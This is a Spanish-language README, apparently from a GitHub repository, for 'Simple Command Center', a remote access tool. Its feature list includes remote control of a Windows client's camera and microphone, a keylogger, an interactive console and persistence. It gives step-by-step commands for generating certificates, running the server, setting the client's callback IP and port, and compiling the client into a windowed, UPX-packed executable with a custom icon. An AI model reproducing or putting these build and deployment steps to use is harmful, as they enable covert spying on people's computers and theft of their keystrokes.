# Simple Command Center

Un centro de comando para enviar comandos a clientes de forma remota y recibir múltiples conexiones.

### Características
- Solo puedes comunicarte con un cliente a la vez.
- Puedes activar remotamente la cámara y el micrófono.
- Admite keylogger.
- Puedes acceder a una consola interactiva.
- Puede tener persistencia en Windows.
- Admite auto-conexiones.
- Admite SSL.
- El cliente solo es compatible con Windows.

## Requisitos
- [Python 3.11.1](https://www.python.org/downloads/release/python-3111/): esta es la versión en la que se probó.
- [OpenSSL](https://www.openssl.org/) para generar certificados.
- En Windows, [Microsoft Visual C++](https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170).

#### Opcional:
- [UPX](https://upx.github.io/) (el Ultimate Packer para ejecutables) para reducir el tamaño del .exe.

## Instalación
1. Primero, descarga el repositorio:
    ```
    git clone https://github.com/whoamih4csor/Simple-Command-Center
    ```
2. Segundo, navega al directorio:
    ```
    cd Simple-Command-Center
    ```
3. Tercero, instala las dependencias con:
    ```
    pip install -r requirements.txt
    ```
    o
    ```
    python -m pip install -r requirements.txt
    ```
4. Cuarto, genera los certificados SSL:
    ```
    openssl req -nodes -x509 -newkey rsa:4096 -keyout server.key -out server.cer -days 356
    ```

## Uso
1. Inicia el servidor:
    ```
    python .\Server.py -m terminal -a IP -p PORT
    ```
    o
    ```
    python .\Server.py -m grafico -a IP -p PORT
    ```
2. Ingresa el comando "ayuda" para obtener más información:
    ```
    ayuda
    ```
3. Modifica los parámetros del cliente:
    - Abre el archivo Client-Windows.py.
    - Cambia las líneas:
        ```
        self.IP = '192.168.0.10' # la IP a la que se conectará el cliente
        self.PORT = 4747 # el puerto IP
        ```
4. Compila el cliente con auto-py-to-exe o con el siguiente comando:
    ```
    pyinstaller --noconfirm --onefile --windowed --name "NOMBRE.exe"  ".\Client-Windows.py"
    ```
    Si instalaste UPX:
    ```
    pyinstaller --noconfirm --onefile --windowed --name "NOMBRE.exe" --upx-dir "Ruta al directorio de UPX"  ".\Client-Windows.py"
    ```
    Si quieres cambiar el icono del binario, agrega:
    ```
    --icon "image.icon"
    ```

## Contribución
Si tienes sugerencias o quieres informar un error, por favor informalo en https://github.com/whoamih4csor/Simple-Command-Center/issues

## Créditos
Gracias a ChatGPT por ayudarme en algunas partes del código.
